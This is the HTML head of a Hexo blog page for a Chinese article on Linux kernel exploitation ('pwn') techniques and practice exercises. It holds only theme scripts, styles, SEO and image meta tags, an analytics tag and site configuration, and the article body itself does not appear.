<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2023/10/16/深入理解pwn_kernel及相关例题/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="前言附件地址 最近重新跟着老师学了一遍Linux内核安全，所以从博客里翻出来这个古老的文章做一些翻新和添油加醋，但内容依然有很多不足，文章结构也比较混乱，后续会进行改进。这里做的是 Linux Kernel pwn 一些利用手法的记录，后面如果学到 Windows kernel pwn会另开一个篇章。篇幅有限，后面一些内容再做补充。本文内容适合入门学习。还有一些内容有时间再写…… 深入理解Pwn_">
<meta property="og:type" content="article">
<meta property="og:title" content="深入理解Pwn_Kernel及相关例题">
<meta property="og:url" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="前言附件地址 最近重新跟着老师学了一遍Linux内核安全，所以从博客里翻出来这个古老的文章做一些翻新和添油加醋，但内容依然有很多不足，文章结构也比较混乱，后续会进行改进。这里做的是 Linux Kernel pwn 一些利用手法的记录，后面如果学到 Windows kernel pwn会另开一个篇章。篇幅有限，后面一些内容再做补充。本文内容适合入门学习。还有一些内容有时间再写…… 深入理解Pwn_">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/kernel_cap.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/RingModel.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/uma.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/numa.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/flatmem.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/DISCONTIGMEM.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/SPARSEMEM.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/mem_section.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/pfn.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/vmemmap.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/x86-64-kernel-layout.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/kernel_stack.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/page-zone-node.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/page_struct.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/zone_struct.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/node_numa.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/zone_struct.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/slub_allocator.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/buddy_sys_sky.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/node_data.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/page_pivote.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/free_area.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/slub_allocator.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/80fbfc5452e6ee425f7676a492aef25a.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241115134915853.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/f7f490f6f668b542aab003ec27135ad2.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/244cd82a22db3cb5168651580d622465-1731649943372-8.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/df0e27a7cc01c0a1ab1b387409d7b8a4.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/3b2a9a9ff98bb492fa0cfef2dc1490f6.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/e9439ea41be5d91a1bc8789c50e098ff.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/06ab07e03d42cc6bd7f1079a157d0c6f.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/8ee336b6de8e8263a5dfa2dad69c99dc.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/11bad950de73843bef8e1716a85bdb0c.png">
<meta property="og:image" content="https://jelasin.github.io/583c765a6df44d6ffd56e4f506174318.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/0dc462afb4eebcf420803eca2491f169.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/Random_freelist.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/4f2684f1ab4ad202e7f03c900f782bdb.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/5a166703c04f45dcaa7dcbf456f5b673.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/KPTI.drawio.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20231207102120309.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/filesys.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240201192628878.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/smep.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905115129293.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240906090938018.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240410172028837.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905101112480.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir2.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir.jpg">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240922171025707.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010143715739.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/9238c63e2b3ebdb287ce19b0dd2c8d24.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/5342f92979ae7f588c2058a4d2144d8b.gif">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/26f0aa72bd11390b7b9790c1fa7cffe9.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7c7268c0160ec64d50ada5c1787f789f.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18766f6b9f8a4dd92bab29f062fa6a7a.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/18a655483165c8fc681c3e8dbf16c645.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20241010203455359.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/yPtXiwzVfxWH7lE-1733799601040-1.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/79biltjNfACIZcP.gif">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/pqLSVaINQ3zAsmO.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/GOSsNPkuMZHlUmT-1734073220227-1.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/i4C7oOvHdG2RqUm.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/7iQO1b64XNaTkG8.png">
<meta property="og:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/e2LRJKzQVYSTO5k.png">
<meta property="article:published_time" content="2023-10-16T12:15:29.000Z">
<meta property="article:modified_time" content="2025-06-04T08:57:03.287Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="Pwn_Kernel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/kernel_cap.jpg">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            深入理解Pwn_Kernel及相关例题 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Essays":{"path":"/essays","icon":"fa-regular fa-comment"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
